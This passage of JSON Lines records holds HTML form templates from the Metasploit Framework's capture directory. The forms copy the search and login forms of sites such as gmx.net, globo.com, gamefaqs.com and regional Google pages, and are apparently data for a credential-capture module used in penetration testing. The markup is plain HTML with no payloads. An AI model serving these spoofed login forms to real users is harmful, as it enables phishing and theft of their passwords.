no_spon\" type=\"text\" id=\"sponsor_searchinput2\" value=\"\" /><input class=\"submit\" type=\"submit\" /></form>", "timestamp": "2025-10-24T23:40:18.299318"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/foxsports.com.txt", "content": "<form name='formZip' class='formElement' action='/tv/schedule' id='formZip' onsubmit='return validate5DigitZIP(this);' method='post' style='display:inline;'> <input name=\"sportCategoryId\" type=\"hidden\" value=\"\" /></form><form name='fsn' class='formElement' id='fsnRegions' style='display:inline;'> </form>", "timestamp": "2025-10-24T23:40:18.636118"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/free.fr.txt", "content": "<form class='form' action='http://adslcgi.free.fr/subscribe/00_choose_offre.pl' method='post'> <input name=\"tel\" class=\"form-input\" type=\"text\" id=\"numero\" maxlength=\"12\" /><input class=\"form-button\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:18.962802"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/freeones.com.txt", "content": "<form name='search' action='/cgi-bin/search.cgi' style='margin: 0px;'> <input name=\"b\" size=\"40\" class=\"SearchBox\" type=\"text\" value=\"\" maxlength=\"40\" /><input name=\"submitnow\" class=\"SearchButton\" type=\"button\" value=\"\" onclick=\"this.form.submit();\" /></form><form style='margin: 0px;'> </form>", "timestamp": "2025-10-24T23:40:19.284480"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/freewebs.com.txt", "content": "<form action='/login.jsp' method='post'> <input name=\"username\" class=\"FW-textbox FW-textbox-inactive FW-bubbleInput\" type=\"text\" id=\"FWloginUsername\" value=\"\" onfocus=\"if(this.value=='username') this.value='';this.className='FW-textbox FW-bubbleInput';\" onblur=\"if(this.value=='') this.value='username';this.className='FW-textbox FW-textbox-inactive FW-bubbleInput';\" /><input name=\"password\" class=\"FW-textbox FW-textbox-inactive FW-bubbleInput\" type=\"text\" id=\"FWloginPassword\" value=\"\" onfocus=\"focusPassword(this);\" /><input class=\"FW-imgbutton\" type=\"image\" src=\"\" alt=\"Login\" /><input name=\"remember\" type=\"hidden\" id=\"FWloginRemember\" value=\"\" /></form><form action='/Directory/viewSites.jsp' method='get'> <input name=\"query\" class=\"FW-textbox FW-textbox-inactive FW-bubbleInput\" type=\"text\" id=\"FWsearchQuery\" value=\"\" onfocus=\"if(this.value=='enter keyword') { this.value=''; this.className='FW-textbox FW-bubbleInput'; }\" onblur=\"if(this.value=='') { this.value='enter keyword'; this.className='FW-textbox FW-textbox-inactive FW-bubbleInput'; }\" /><input class=\"FW-imgbutton\" type=\"image\" src=\"\" alt=\"Go\" /></form>", "timestamp": "2025-10-24T23:40:19.610107"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/friendster.com.txt", "content": "<form name='headsearchform' action='http://www.friendster.com/headersearch.php' id='headersearch' method='get' target='_top'> <input name=\"search\" type=\"hidden\" value=\"\" /><input name=\"sf\" type=\"hidden\" value=\"\" /><input name=\"filter\" type=\"hidden\" value=\"\" /><input name=\"loc\" type=\"hidden\" value=\"\" /><input name=\"statpos\" type=\"hidden\" value=\"\" /><input name=\"s\" type=\"hidden\" value=\"\" /><input name=\"s\" class=\"globnav_textbox\" type=\"text\" id=\"searchinput\" value=\"\" onfocus=\"this.value=''; this.onfocus=null;\" maxlength=\"200\" /><input name=\"search\" type=\"hidden\" value=\"\" /></form><form name='login_form' action='/login.php' method='post'> <input name=\"_submitted\" type=\"hidden\" value=\"\" /><input name=\"next\" type=\"hidden\" value=\"\" /><input name=\"tzoffset\" type=\"hidden\" value=\"\" /><input name=\"email\" tabindex=\"1\" size=\"22\" type=\"text\" value=\"\" alt=\"Email Address\" maxlength=\"100\" style=\"width: 200px !important;\" /><input name=\"password\" tabindex=\"2\" size=\"22\" type=\"password\" alt=\"Password\" maxlength=\"10\" style=\"width: 200px !important;\" /><input name=\"remembermyemail\" type=\"checkbox\" id=\"remembermyemail\" /><input name=\"btnLogIn\" tabindex=\"3\" type=\"submit\" value=\"\" /><input name=\"btnSignUp\" tabindex=\"4\" class=\"orangebutton\" type=\"button\" value=\"\" onclick=\"window.location='join.php'\" /></form><form name='usersearchform' action='/usersearch.php' method='get'> <input name=\"search\" type=\"hidden\" value=\"\" /><input name=\"sf\" type=\"hidden\" value=\"\" /><input name=\"usearch\" type=\"text\" maxlength=\"200\" style=\"margin: 0 5px 0 0; width: 165px;\" /><input name=\"cont\" class=\"middlealign\" type=\"submit\" value=\"\" style=\"margin: 0 0 7px 7px;\" /></form>", "timestamp": "2025-10-24T23:40:19.920101"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/gaiaonline.com.txt", "content": "<form action='http://login.gaiaonline.com/gaia/login.php' method='post' id='loginForm'> <input name=\"username\" tabindex=\"1\" type=\"text\" id=\"username\" /><input name=\"password\" tabindex=\"2\" type=\"password\" id=\"password\" /><input tabindex=\"4\" title=\"Sign In\" type=\"image\" src=\"\" id=\"signInButton\" alt=\"Sign In\" /><input name=\"autologin\" tabindex=\"3\" type=\"checkbox\" id=\"autoLogin\" /><input name=\"oldindex\" type=\"hidden\" value=\"\" /><input name=\"frob\" type=\"hidden\" value=\"\" /><input name=\"token\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:20.241216"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/gamefaqs.com.txt", "content": "<form action='/user/login.html' id='login' method='post'> <input name=\"path\" type=\"hidden\" value=\"\" /><input name=\"EMAILADDR\" type=\"text\" id=\"email\" maxlength=\"90\" /><input name=\"PASSWORD\" type=\"password\" id=\"password\" maxlength=\"20\" /><input type=\"image\" src=\"/images/v9_log_in.gif\" id=\"logbutton\" /></form><form action='/search/index.html' id='search' method='get'> <input name=\"game\" class=\"text\" type=\"text\" id=\"searchtextbox\" value=\"\" /></form><form action='/search/go.php' id='sys' method='get'> </form><form action='/poll/index.html?poll=3096' method='post' id='polloftheday'> <input name=\"opt\" class=\"radio\" type=\"radio\" value=\"\" /><input name=\"opt\" class=\"radio\" type=\"radio\" value=\"\" /><input name=\"opt\" class=\"radio\" type=\"radio\" value=\"\" /><input name=\"opt\" class=\"radio\" type=\"radio\" value=\"\" /><input name=\"opt\" class=\"radio\" type=\"radio\" value=\"\" /><input type=\"image\" src=\"\" border=\"0\" id=\"poll_submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:20.573386"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/gamespot.com.txt", "content": "<form name='search' action='http://m.gamespot.com/search.php' method='get' id='search'> <input name=\"q\" size=\"12\" type=\"text\" value=\"\" onfocus=\"value=''\" style=\"color:#666;\" /><input name=\"search\" type=\"submit\" value=\"\" /></form><form name='search' action='http://m.gamespot.com/login/?ref=http%3A%2F%2Fm.gamespot.com%2Findex.html' method='get' id='search'> <input name=\"ref\" type=\"hidden\" value=\"\" /><input name=\"login\" type=\"submit\" value=\"\" /></form><form name='search' action='http://m.gamespot.com/search.php' method='get' id='search'> <input name=\"q\" size=\"12\" type=\"text\" value=\"\" onfocus=\"value=''\" style=\"color:#666;\" /><input name=\"search\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:20.901925"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/gametrailers.com.txt", "content": "<form name='search' action='http://www.gametrailers.com/search.php' method='get' style='margin: 0px;'> <input name=\"s\" class=\"searchinput\" type=\"text\" id=\"searchinput\" value=\"\" /></form><form name='userlog' action='/index.php?' method='post' id='userlog' style='margin: 0px;'> <input name=\"username\" class=\"userlogin_input\" type=\"text\" id=\"username\" value=\"\" /><input name=\"password\" class=\"userlogin_input\" type=\"password\" id=\"password\" value=\"\" /><input name=\"try\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:21.237781"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/gather.com.txt", "content": "<form name='searchForm' class='navigation' action='searchResults.jsp' id='searchForm' method='GET' onsubmit='return searchActionPage();'> <input name=\"keywords\" type=\"text\" onkeyup=\"isEmpty(this);\" id=\"searchInput\" onfocus=\"searchState(this);\" onblur=\"searchState(this);\" /><input name=\"submit\" class=\"button\" type=\"submit\" value=\"\" /><input name=\"contentType\" type=\"hidden\" value=\"\" /></form><form name='loginForm' action='login.action' id='loginForm' method='post'> <input name=\"beamBack\" type=\"hidden\" id=\"beamBack\" value=\"\" /><input name=\"username\" size=\"20\" type=\"text\" id=\"signInUsername\" value=\"\" style=\"width:95px;\" /><input name=\"password\" size=\"20\" type=\"password\" id=\"password\" maxlength=\"20\" style=\"width:95px;\" /><input class=\"button\" type=\"submit\" id=\"submitButton\" value=\"\" /><input name=\"remember\" type=\"checkbox\" id=\"cbremember\" value=\"\" style=\"margin-left:0px;\" /></form>", "timestamp": "2025-10-24T23:40:21.558559"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/geocities.com.txt", "content": "<form name='form1' action='http://us.rd.yahoo.com/geohome/signinpage/searchbox/*http://us.geocities.yahoo.com/search' method='get'> <input name=\"p\" size=\"25\" type=\"text\" maxlength=\"200\" /><input name=\"Submit\" type=\"image\" src=\"\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:21.882943"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/geocities.jp.txt", "content": "<form action='http://search.yahoo.co.jp/bin/search' method='get'> <input name=\"p\" size=\"30\" /><input name=\"vs\" type=\"hidden\" value=\"\" /><input name=\"fr\" type=\"hidden\" value=\"\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:22.215430"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/globo.com.txt", "content": "<form name='formBuscaBarra2007' action='http://busca.globo.com/Sites/busca/buscar.ssp' method='post' onsubmit='return submitBuscaHome2007(this);'> <input name=\"query\" class=\"textbox\" type=\"text\" id=\"query\" maxlength=\"250\" /><input name=\"botaoSubmitBarra2007\" class=\"botaoOK\" type=\"submit\" value=\"\" /><input name=\"produto\" type=\"hidden\" id=\"produto\" /></form><form action='http://webmail.globo.com/LoginWebmail/autenticarUsuario.ssp' method='post' id='box-globomail' onsubmit='return submitGlobomail(this)'> <input name=\"iDominio\" type=\"hidden\" value=\"\" /><input name=\"sPlain\" type=\"hidden\" value=\"\" /><input name=\"sLanguage\" type=\"hidden\" value=\"\" /><input name=\"userName\" class=\"textbox\" type=\"text\" id=\"email\" maxlength=\"100\" /><input name=\"password\" class=\"textbox\" type=\"password\" id=\"senha\" maxlength=\"20\" /><input class=\"botao\" type=\"submit\" value=\"\" /></form><form name='formBuscaRodape2007' action='http://busca.globo.com/Sites/busca/buscar.ssp' onsubmit='return submitBuscaHome2007(this);' method='post'> <input name=\"query\" class=\"textbox\" type=\"text\" id=\"query\" maxlength=\"250\" /><input class=\"botao\" type=\"submit\" value=\"\" /><input name=\"produto\" type=\"hidden\" id=\"produto\" /></form>", "timestamp": "2025-10-24T23:40:22.538908"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/gmx.net.txt", "content": "<form name='webSearchForm' action='http://suche.gmx.net/search/web/' id='formSearch' method='get'> <input name=\"mc\" type=\"hidden\" value=\"\" /><input name=\"su\" type=\"text\" id=\"inpSearchText\" /><input class=\"image\" type=\"image\" src=\"//img.ui-portal.de/gmx/home/icons/btn-searchform.gif\" id=\"inpSearchSubmit\" value=\"\" /></form><form name='login' action='//service.gmx.net/de/cgi/login' id='formLogin' method='post'> <input name=\"AREA\" type=\"hidden\" value=\"\" /><input name=\"EXT\" type=\"hidden\" value=\"\" /><input name=\"EXT2\" type=\"hidden\" value=\"\" /><input name=\"uinguserid\" type=\"hidden\" value=\"\" /><input name=\"id\" class=\"field\" type=\"text\" id=\"username\" value=\"\" /><input name=\"p\" class=\"field\" type=\"password\" id=\"password\" value=\"\" /><input class=\"submit more\" type=\"submit\" id=\"inpLoginSubmit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:22.854144"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/go.com.txt", "content": "<form name='searchtop' action='http://transfer.go.com/cgi/transfer.dll' method='get' style='display:inline;'> <input name=\"srvc\" type=\"hidden\" value=\"\" /><input name=\"name\" type=\"hidden\" value=\"\" /><input name=\"trackingType\" type=\"hidden\" value=\"\" /><input name=\"p\" class=\"searchBox\" type=\"text\" /><input name=\"goto\" type=\"hidden\" value=\"\" /><input name=\"sa\" class=\"searchbutton\" type=\"image\" src=\"\" border=\"0\" onclick=\"_hbLink('SearchBtn');form.submit()\" /></form><form name='Search1' action='http://jas.familyfun.go.com/arts-and-crafts?page=CraftSearch' method='POST'> <input type=\"image\" src=\"\" border=\"0\" alt=\"Go\" style=\"position:relative; top:3px;\" /></form><form name='recipefinder' action='' method='get' onsubmit='return goTo()'> <input name=\"words\" type=\"text\" id=\"searchBox\" maxlength=\"50\" style=\"width: 125px; height: 19px; font-size: 9px;\" /><input name=\"imageField\" type=\"image\" src=\"\" border=\"0\" alt=\"Go\" style=\"position:relative; top:3px;\" /></form><form name='SearchMaps' action='http://www.mapquest.com/maps/map.adp?' method='post' target='_self'> <input name=\"address\" size=\"12px\" class=\"txtField\" type=\"Text\" maxlength=\"80\" /><input name=\"zipcode\" size=\"6\" class=\"txtField\" type=\"Text\" maxlength=\"5\" /><input name=\"city\" size=\"12px\" class=\"txtField\" type=\"Text\" maxlength=\"80\" /><input type=\"image\" src=\"\" border=\"0\" alt=\"Find Map\" /></form><form name='searchbottom' action='http://transfer.go.com/cgi/transfer.dll' method='get' style='display:inline;'> <input name=\"srvc\" type=\"hidden\" value=\"\" /><input name=\"name\" type=\"hidden\" value=\"\" /><input name=\"trackingType\" type=\"hidden\" value=\"\" /><input name=\"p\" class=\"searchBox\" type=\"text\" /><input name=\"goto\" type=\"hidden\" value=\"\" /><input name=\"sa\" class=\"searchbutton\" type=\"image\" src=\"\" border=\"0\" onclick=\"_hbLink('SearchBtn');form.submit()\" /></form>", "timestamp": "2025-10-24T23:40:23.174528"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/goo.ne.jp.txt", "content": "<form action='http://search.goo.ne.jp/web.jsp' id='gsWeb_body' style='padding:0; margin:0'> <input name=\"MT\" size=\"45\" class=\"text\" type=\"text\" value=\"\" style=\"ime-mode: active;\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u30a6\u30a7\u30d6\" width=\"96\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"from\" type=\"hidden\" value=\"\" /></form><form action='http://search.goo.ne.jp/web.jsp' id='gsDic_body' style='display:none; padding:0; margin:0'> <input name=\"MT\" size=\"45\" class=\"text\" type=\"text\" value=\"\" style=\"ime-mode: active;\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u8f9e\u66f8\u691c\u7d22\" width=\"96\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /></form><form action='http://search.goo.ne.jp/web.jsp' id='gsOsi_body' style='display:none; padding:0; margin:0'> <input name=\"MT\" size=\"45\" class=\"text\" type=\"text\" value=\"\" style=\"ime-mode: active;\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u6559\u3048\u3066!\u691c\u7d22\" width=\"96\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"from\" type=\"hidden\" value=\"\" /></form><form action='http://search.goo.ne.jp/web.jsp' id='gsImg_body' style='display:none; padding:0; margin:0'> <input name=\"MT\" size=\"45\" class=\"text\" type=\"text\" value=\"\" style=\"ime-mode: active;\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u753b\u50cf\u691c\u7d22\" width=\"96\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /></form><form action='http://search.goo.ne.jp/web.jsp' id='gsBlg_body' style='display:none; padding:0; margin:0'> <input name=\"MT\" size=\"45\" class=\"text\" type=\"text\" value=\"\" style=\"ime-mode: active;\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u30d6\u30ed\u30b0\u691c\u7d22\" width=\"96\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /></form><form action='http://search.goo.ne.jp/web.jsp' id='gsCtg_body' style='display:none; padding:0; margin:0'> <input name=\"MT\" size=\"45\" class=\"text\" type=\"text\" value=\"\" style=\"ime-mode: active;\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u30ab\u30c6\u30b4\u30ea\u30fc\u691c\u7d22\" width=\"96\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /></form><form action='http://search.goo.ne.jp/web.jsp' id='gsMap_body' style='display:none; padding:0; margin:0'> <input name=\"MT\" size=\"45\" class=\"text\" type=\"text\" value=\"\" style=\"ime-mode: active;\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u5730\u56f3\u691c\u7d22\" width=\"96\" /><input name=\"sw\" type=\"hidden\" value=\"\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /></form><form onkeypress='return enter_form(event)' action='http://search.goo.ne.jp/web.jsp' id='gsTwn_body' style='display:none; padding:0; margin:0'> <input name=\"MT\" class=\"text\" type=\"text\" id=\"gsTwn_body_MT\" value=\"\" style=\"ime-mode: active;width:127px;\" /><input name=\"areakey\" class=\"text\" type=\"text\" id=\"gsTwn_body_areakey\" value=\"\" style=\"ime-mode: active;width:128px;\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u30bf\u30a6\u30f3\u30da\u30fc\u30b8\" width=\"96\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /></form><form action=''> <input type=\"checkbox\" id=\"autoUpdate\" /></form><form action='http://search.goo.ne.jp/web.jsp'> <input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"on_st\" class=\"text\" type=\"text\" id=\"on_st\" value=\"\" /><input name=\"off_st\" class=\"text\" type=\"text\" id=\"off_st\" value=\"\" /><input type=\"submit\" id=\"route_btn\" value=\"\" /></form><form name='query_footer' action='http://search.goo.ne.jp/web.jsp'> <input name=\"MT\" class=\"text\" type=\"text\" id=\"searchbottom\" value=\"\" /><input name=\"\" class=\"image\" type=\"image\" src=\"\" value=\"\" height=\"22\" alt=\"\u30a6\u30a7\u30d6\" width=\"96\" /><input name=\"STYPE\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"from\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:23.501905"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.ae.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"\u00c8\u00cd\u00cb Google\u00fe\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:23.819750"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.at.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google-Suche\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:24.152011"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.be.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google zoeken\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:24.489724"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.ca.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google Search\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:24.829093"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.cl.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Buscar con Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:25.485728"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.cn.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" autocomplete=\"off\" size=\"55\" title=\"Google \u00cb\u00d1\u00cb\u00f7\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"ch\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:25.812620"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.co.hu.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google keres\u00e9s\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:26.175156"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.co.id.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Telusuri dengan Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:26.492650"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.co.jp.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google \u0152\u0178\u008d\u00f5\" value=\"\" maxlength=\"2048\" style=\"border:solid 1px #7f9db9\" /><input name=\"btnG\" type=\"submit\" value=\"\" style=\"height:1.8em\" /><input name=\"btnI\" type=\"submit\" value=\"\" style=\"height:1.8em\" /><input name=\"lr\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"lr\" type=\"radio\" id=\"il\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:27.148287"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.co.th.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"\u00a4\u00e9\u00b9\u00cb\u00d2\u00e2\u00b4\u00c2 Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:27.454178"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.com.br.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Pesquisa Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:29.379534"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.com.ph.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Hanapin sa Google\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:31.382744"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.com.tr.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" size=\"55\" title=\"Google'da Ara\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:32.757162"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/google.com.tw.txt", "content": "<form name='f' action='/search'> <input name=\"hl\" type=\"hidden\" value=\"\" /><input name=\"ie\" type=\"hidden\" value=\"\" /><input name=\"q\" autocomplete=\"off\" size=\"55\" title=\"Google \u00b7j\u00b4M\" value=\"\" maxlength=\"2048\" /><input name=\"btnG\" type=\"submit\" value=\"\" /><input name=\"btnI\" type=\"submit\" value=\"\" /><input name=\"meta\" checked type=\"radio\" id=\"all\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"ch\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"lgr\" value=\"\" /><input name=\"meta\" type=\"radio\" id=\"cty\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:33.066498"}
